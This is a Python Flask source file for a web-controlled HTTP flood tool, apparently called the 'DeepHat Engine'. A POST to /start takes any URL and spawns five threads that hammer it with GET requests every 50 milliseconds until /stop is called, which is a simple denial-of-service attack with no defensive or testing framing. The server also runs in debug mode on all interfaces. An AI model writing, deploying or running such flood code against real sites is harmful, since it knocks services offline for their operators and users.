import os
from flask import Flask, request, jsonify
from flask_cors import CORS
from pydantic import BaseModel, HttpUrl, ValidationError
from dotenv import load_dotenv
import threading
import requests
import time

# Load environment variables from a .env file
load_dotenv()

app = Flask(__name__)
CORS(app)

# --- Data Validation Schema ---
class AttackConfig(BaseModel):
    # This ensures the URL is a valid HTTP/HTTPS link
    target_url: HttpUrl 

# --- Global State ---
is_flooding = False

def flood_worker(target_url):
    global is_flooding
    print(f"[!] Thread active on: {target_url}")
    
    while is_flooding:
        try:
            # Using a session for connection pooling (faster)
            with requests.Session() as session:
                response = session.get(target_url, timeout=5)
                print(f"[+] Request sent | Status: {response.status_code}")
        except Exception as e:
            print(f"[!] Worker Error: {e}")
        
        time.sleep(0.05) 

@app.route('/start', methods=['POST'])
def start_flood():
    global is_flooding
    
    data = request.json
    url_input = data.get('url')

    # 1. Validate input using Pydantic
    try:
        config = AttackConfig(target_url=url_input)
    except ValidationError as e:
        return jsonify({"error": "Invalid URL format", "details": e.errors()}), 400
    except Exception:
        return jsonify({"error": "Malformed request"}), 400

    if is_flooding:
        return jsonify({"message": "Already flooding!"}), 200

    is_flooding = True
    
    # 2. Start Threads
    for _ in range(5): 
        thread = threading.Thread(target=flood_worker, args=(str(config.target_url),))
        thread.daemon = True
        thread.start()
    
    return jsonify({"message": f"Flood started on {config.target_url}"})

@app.route('/stop', methods=['POST'])
def stop_flood():
    global is_flooding
    is_flooding = False
    return jsonify({"message": "Stopping all threads..."})

if __name__ == '__main__':
    # Use environment variable for port if available, else 5000
    port = int(os.getenv('PORT', 5000))
    print(f"--- DeepHat Engine Running on Port {port} ---")
    app.run(host='0.0.0.0', port=port, debug=True)